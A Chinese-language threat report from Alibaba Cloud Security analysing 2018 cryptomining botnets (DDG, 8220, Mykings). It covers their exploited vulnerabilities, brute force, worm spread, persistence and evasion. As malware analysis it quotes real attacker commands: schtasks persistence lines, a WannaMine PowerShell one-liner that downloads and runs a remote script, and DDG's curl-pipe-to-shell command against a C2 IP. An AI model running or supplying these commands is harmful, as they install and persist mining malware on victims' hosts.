**作者：阿里云安全  
来源公众号：[阿里云安全](https://mp.weixin.qq.com/s/Qov1NYtcxX18GPpIaXfWhQ "阿里云安全")**
在刚刚过去的 2018
年，恶意挖矿事件层出不穷。尽管加密货币的价格经历了狂欢后的暴跌之痛，但挖矿仍是网络黑产团伙在入侵服务器之后，最直接的变现手段。随着挖矿团伙产业化，我们看到越来越多的0-Day/N-Day
漏洞在公布后的极短时间内就被用于入侵挖矿；同时，一些"根深蒂固"存在的问题，如弱密码和应用权限配置不当也成为了恶意挖矿活动的温床。
在可预见的未来，黑产团伙利用漏洞发起攻击进行挖矿的趋势仍将持续，已被入侵挖矿的机器也随时可能被挖矿攻击者当成下一轮攻击的
“跳板”。本报告以阿里云 2018 年的攻防数据为基础，对恶意挖矿态势进行了分析，并为个人和企业提出了合理的安全防护建议。
### 核心概要
  * 热点 0-Day/N-Day 漏洞成为挖矿团伙的“武器库”,0-Day 漏洞留给用户进行修复的窗口期变短；
  * 非 Web 网络应用暴露在公网后成为挖矿团伙利用的重灾区；
  * 挖矿团伙广泛利用暴力破解进行传播，弱密码仍然是互联网面临的主要威胁；
  * 挖矿后门普遍通过蠕虫形式传播，并在受害主机上通过持久化驻留获取最大收益；
  * 挖矿团伙会通过伪装进程、加壳、代码混淆、私搭矿池（代理）等手段规避安全分析和溯源。
### 攻击态势分析
**【热点 0-Day/N-Day 漏洞利⽤成为挖矿团伙的"武器库",0-Day 漏洞留给⽤户进⾏修复的窗⼝期变短】**
2018 年，多个应用广泛的 web
应用爆出高危漏洞，对互联网安全造成严重威胁。事后安全社区对漏洞信息的分析和漏洞细节的分享，让利用代码能够方便的从互联网上获取。挖矿团伙自然不会放过这些唾手可
得的“武器库”。此外一些持续未得到普遍修复的 N-Day 漏洞往往也会被挖矿团伙利用，例如近年热门的反序列化漏洞和 Struts
系列的远程执行漏洞等。下图展示的是部分热点 0-Day/N-Day 漏洞被挖矿团伙大量利用的时间线。
同时阿里云观察到， 0-Day 漏洞从披露到大规模利用之间的时间间隔越来越小。如 Jboss 反序列化漏洞于 2017 年 5
月被发现，年底JbossMiner 开始对其大规模利用，并在 2018 年 3 月达到高峰。而今年Drupal 和 ThinkPHP
远程命令执行漏洞从披露到被挖矿团伙广泛利用， 时间间隔都小于一个月。因此在高危 0-Day 漏洞爆出后未能及时修复的用户，容易成为恶意挖矿的受害者。
**【⾮ Web ⺴络应⽤暴露在公⺴后成为挖矿团伙利⽤的重灾区】**
企业对 Web 应用可能造成的安全威胁已经有足够的重视， WAF、RASP、漏洞扫描等安全产品也提升了 Web 应用的安全水位。而非 Web
网络应用(Redis、Hadoop、SQLServer 等)往往并非企业核心应用，企业在安全加固和漏洞修复上投入并不如 Web
应用，往往导致高危漏洞持续得不到修复，因而挖矿团伙也会针对性利用互联网上这些持续存在的弱点应用，如 DDG 团伙就持续的利用 Redis
未授权访问漏洞扩大其感染量。下图展示的是 2018 年非 Web 网络应用漏洞被挖矿团伙利用的时间线。
**【挖矿团伙⼲泛利⽤暴⼒破解进⾏传播，弱密码仍然是互联⺴⾯临的主要威胁】**
下图为不同应用被入侵导致挖矿所占百分比，可以发现SSH/RDP/SQLServer
是挖矿利用的重点应用，而这些应用通常是因为弱密码被暴力破解导致被入侵感染挖矿病毒。由此可以看出弱密码导致的身份认证问题仍然是互联网面临的重要威胁。
### 恶意行为
**【挖矿后⻔普遍通过蠕⾍形式传播】**
大多数的挖矿团伙在感染受害主机植入挖矿木马后，会控制这些受害主机对本地网络及互联网的其他主机进行扫描和攻击，从而扩大感染量， 如
DDG、DockerKiller、RDPMiner 等团伙。这些挖矿木马传播速度较快，且很难在互联网上根除，因为一旦少量主机受到恶意程序感染，
它会受控开始攻击其他主机，导致其它带有漏洞或存在配置问题的主机也很快沦陷。
少量挖矿团伙会直接控制部分主机进行网络攻击，入侵受害主机后只在主机植入挖矿后门，并不会进一步扩散。最有代表性的就是 8220
挖矿团伙。这类团伙一般漏洞利用手段比较丰富，漏洞更新速度较快。
**【挖矿团伙会在受害主机上通过持久化驻留获取大收益】**
大多数的挖矿团伙，都会尝试在受害主机上持久化驻留以获取最大收益。
通常在 Linux 系统中，挖矿团伙通过 crontab 设置周期性被执行的指令。在 Windows 系统中，挖矿团伙通常使用 schtask 和 WMI
来达到持久化的目的。
如下为 Bulehero 木马执行添加周期任务的 schtask 命令:
    cmd /c schtasks /create /sc minute /mo 1 /tn "Miscfost" /ru system/tr "cmd /c C:\Windows\ime\scvsots.exe"
    cmd /c schtasks /create /sc minute /mo 1 /tn "Netframework" /rusystem /tr "cmd /c echo Y|cacls C:\Windows\scvsots.exe /p everyone:F"
例如 WannaMine 利用 WMI 进行定时任务的添加，脚本代码如下：
    cmd /c echo powershell -nop "$a=([string](Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding ));if(($a -eq $null) -or (!($a.contains('SCM Event Filter')))) {IEX(New-Object Net.WebClient).DownloadString('http[:]//stafftest.spdns[.]eu:8000/mate6.ps1')}" >%temp%\y1.bat && SCHTASKS /create /RU System /SC DAILY /TNyastcat /f /TR "%temp%\y1.bat" &&SCHTASKS /run /TN yastcat
**【挖矿团伙会通过伪装进程、加壳、代码混淆、私搭矿池或代理等手段规避安全分析和溯源】**
Bulehero 挖矿网络使用的病毒下载器进程名为 scvsots.exe，与windows 正常程序的名字 svchost.exe
极其相似；其它僵尸网络使用的恶意程序名，像 taskhsot.exe、taskmgr.exe、java 这类形似正常程序的名称也是屡见不鲜。
专业的安全工程师或许能够通过程序存放路径或是查询
md5、分析二进制程序等，能够得知合法程序已遭到恶意软件替换。但针对普通运维人员，上述这样伪装成正常系统文件的文件名能够降低被分析发现的概率。
在分析挖矿僵尸网络的过程中我们发现，大多数后门二进制程序都被加壳，最经常被使用的是 Windows 下的 UPX、VMP、sfxrar 等，如下图，几乎每个
RDPMiner 使用的恶意程序都加了上述三种壳之一。
此外，挖矿团伙使用的恶意脚本往往也经过各种混淆。如下图， JBossMiner 挖矿僵尸网络在其 vbs 恶意脚本中进行混淆加密。
尽管人工分析时可以通过多种手段去混淆或解密，但加密和混淆对逃避杀毒软件而言，仍是非常有效的手段。
恶意挖矿团伙使用用自己的钱包地址连接公开矿池，可能因为矿池收到投诉导致钱包地址被封禁，如 8220 团伙的钱包地址由于“涉及僵尸网络活动”而被
monerohash.com 矿池封禁。挖矿团伙倾向于更多的使用矿池代理或私搭矿池的方式进行挖矿。进而安全研究人员也难以通过矿池公布的 HashRate
和付款历史估算出被入侵主机的数量和规模。
![
](https://images.seebug.org/content/images/2019/01/807dfd44-006b-4d66-9418-d80477ed416f.png-w331s)
### 主流团伙概述
#### 1\. DDG 挖矿团伙
从 2017 年底首次被曝光至今， DDG 挖矿僵尸网络一直保持着极高的活跃度。其主要恶意程序由 go
语言写成，客观上对安全人员研究分析造成了一定阻碍。而频繁的程序配置改动、技术手段升级，使它堪称
2018 年危害最大的挖矿僵尸网络。
1)主要利用漏洞：
  * Orientdb 漏洞（早期） 
  * Redis 未授权访问漏洞
  * SSH 弱密码
2)主要恶意行为：
  * 下载、释放、运行多个包含扫描、挖矿等功能的恶意程序
3)主要命令控制和更新方式：
  * 以 104.236.156.211 等多个 ip 地址为恶意脚本分发平台
  * 服务器 cc 端口号通常为 8000 或 8443
4)挖矿网络结构：
DDG 挖矿僵尸网络控制受感染主机执行以下命令，下载 i.sh 脚本。
    /bin/sh -c curl -L http://104.236.156.211:8000/i.sh | sh
而执行 i.sh，会进一步下载 ddgs 恶意程序、挖矿程序等。在一年多的迭代过程中， DDG 经历了多轮更新，大版本从 201X 进化到
301X,目前最新观测到的小版本号为 3019，各模块结构功能如下图所示：
![
](https://images.seebug.org/content/images/2019/01/337d80d4-0978-454e-8297-28fe99fb5c04.png-w331s)
#### 2\. 8220 挖矿团伙
在诸多挖矿僵尸网络中， 8220 团伙的挖矿木马独树一帜，因为它并未采用蠕虫型传播，而是直接对漏洞进行利用。
这种方式理论上传播速度较慢，相较于蠕虫型传播的僵尸网络也更难存活，但 8220 挖矿团伙仍以这种方式获取了较大的感染量。
1)主要利用漏洞：
  * WebLogic XMLDecoder 反序列化漏洞
  * Drupal 远程代码执行漏洞
  * JBoss 反序列化命令执行漏洞
  * Couchdb 的组合漏洞
  * Redis 未授权访问
  * Hadoop Yarn 未授权访问漏洞
2)主要恶意行为：
  * 下载、释放、运行多个包含扫描、挖矿等功能的恶意程序
  * 解密数据段中的矿机，选择一个傀儡进程，将矿机注入傀儡进程中进行挖矿
3)主要命令控制和更新方式：
  * 以多个服务器作为恶意程序分发平台，控制受害主机下载恶意程序
4)挖矿网络结构：
#### 3\. Mykings(theHidden)挖矿团伙
Mykings（又名 theHidden“隐匿者”）挖矿网络在 2017 年中就被多家友商提及并报道。它从 2014
年开始出现，时至今日该僵尸网络依然活跃，可以说是拥有非常旺盛的生命力。该僵尸网络极为复杂，集成了 Mirai、Masscan
等恶意程序的功能，此外在payload、BypassUAC
部分都使用极其复杂的加密混淆技术，掩盖攻击意图，逃避安全软件的检测和安全研究人员的分析。该挖矿僵尸网络在 11
月底更是被发现与“暗云”联手，危害性再次增强。
1)主要利用漏洞：
该挖矿僵尸网络传播主要是基于名为 msinfo.exe 的恶意程序，对1433 等端口进行爆破扫描。其他被扫描的端口和服务包括：
  * 3306 MySQL
  * 135 WMI
  * 22 SSH
  * 445 IPC
  * 23 Telnet
  * 80 Web
  * 3389 RDP
2)主要恶意行为：
  * 下载、释放、运行多个包含扫描、挖矿等功能的恶意程序
  * （结合“暗云”木马后）植入会修改 MBR 的 Bootkit
3)主要命令控制和更新方式
  * 以多个服务器作为恶意程序分发平台，控制受害主机下载恶意程序
4)挖矿网络结构：